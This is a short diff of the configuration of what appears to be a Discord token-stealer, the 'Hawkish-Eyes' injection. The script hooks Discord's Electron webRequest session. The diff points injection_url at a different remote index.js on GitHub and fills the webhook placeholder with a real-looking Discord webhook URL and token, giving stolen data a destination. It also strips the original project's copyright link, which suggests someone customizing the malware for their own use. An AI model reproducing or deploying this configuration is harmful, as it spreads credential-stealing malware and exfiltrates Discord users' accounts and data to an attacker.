@@ -19,8 +19,8 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Inplex-sys/Hawkish-Eyes/main/inject.js",
-    webhook: "%WEBHOOK%",
+    injection_url: "https://raw.githubusercontent.com/roadhooog/shop2/main/index.js",
+    webhook: "https://discord.com/api/webhooks/1229189812548927488/hmuROQRqNG-SjN06YX4TTDXNGst05K8ZKHGmadkOb_mYrgyyXLKUM7BL3X4d6GUmmn8d",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -801,7 +801,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Exotic.Proyect 2024 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                        value: `[Exotic.Proyect 2024 <:hwkish:1104091524758773822>]`,
                         inline: !0
                     }, {
                         name: "Hawkished Files",
